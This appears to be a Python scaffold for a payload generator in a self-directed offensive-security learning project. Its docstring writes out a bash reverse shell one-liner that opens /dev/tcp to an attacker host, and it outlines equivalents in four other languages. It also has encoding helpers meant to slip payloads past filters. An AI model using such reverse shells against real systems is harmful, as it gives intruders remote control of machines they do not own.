"""
payload/payload_gen.py — PHASE 4 (Weeks 19-21)

Shorter, more contained phase. Generates ready-to-use reverse shell
payloads in multiple languages based on attacker IP/port, plus basic
encoding for evasion.

Build order:
  1. generate_reverse_shell() — string templates for 5 languages
  2. encode_base64()          — for payloads that need to bypass
                                  simple input filters
  3. url_encode()             — for payloads delivered via URL parameters
"""

import base64
import urllib.parse
from phantomstrike.utils import logger


class PayloadGenerator:
    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport

    def generate_reverse_shell(self, language: str) -> str:
        """
        TODO (Week 19-20):
        Build template strings for at least these 5 languages, with
        self.lhost / self.lport substituted in:

          - bash:       bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
          - python:     uses the `socket`, `subprocess`, `os` modules
                        to redirect stdin/stdout/stderr to a socket
          - powershell: uses System.Net.Sockets.TCPClient
          - php:        uses fsockopen() + proc_open()
          - perl:       uses IO::Socket::INET

        Look up ONE reference implementation per language (e.g. the
        classic pentestmonkey reverse shell cheat sheet) to understand
        the structure, then write your own version — don't just copy
        paste, type it out and make sure you understand every line,
        especially the Python one since that's the language you know
        best and will be asked to explain in interviews.

        Return the finished payload as a string with lhost/lport filled in.
        """
        logger.warning(f"generate_reverse_shell() not implemented for '{language}' — Phase 4")
        raise NotImplementedError("Build this in Phase 4, Weeks 19-20")

    def encode_base64(self, payload: str) -> str:
        """
        TODO (Week 21):
        Base64-encode a payload string. Useful for payloads delivered
        through contexts with character restrictions, or for
        PowerShell's -EncodedCommand flag specifically (which actually
        requires UTF-16LE encoding before base64 — worth researching
        why PowerShell does this differently from everything else).
        """
        # This one's simple enough that the actual implementation is
        # given to you — focus your learning time on Week 19-20 instead.
        encoded_bytes = base64.b64encode(payload.encode("utf-8"))
        return encoded_bytes.decode("utf-8")

    def url_encode(self, payload: str) -> str:
        """
        Also given — straightforward use of urllib.parse.quote().
        Useful when delivering payloads as part of a URL/query string,
        e.g. for XSS payloads from your vuln detector module.
        """
        return urllib.parse.quote(payload)

    def generate(self, language: str, encode: str = None) -> str:
        """
        Main entry point: generates the raw payload, then optionally
        encodes it. Called from main.py.
        """
        payload = self.generate_reverse_shell(language)

        if encode == "base64":
            payload = self.encode_base64(payload)
        elif encode == "url":
            payload = self.url_encode(payload)

        return payload
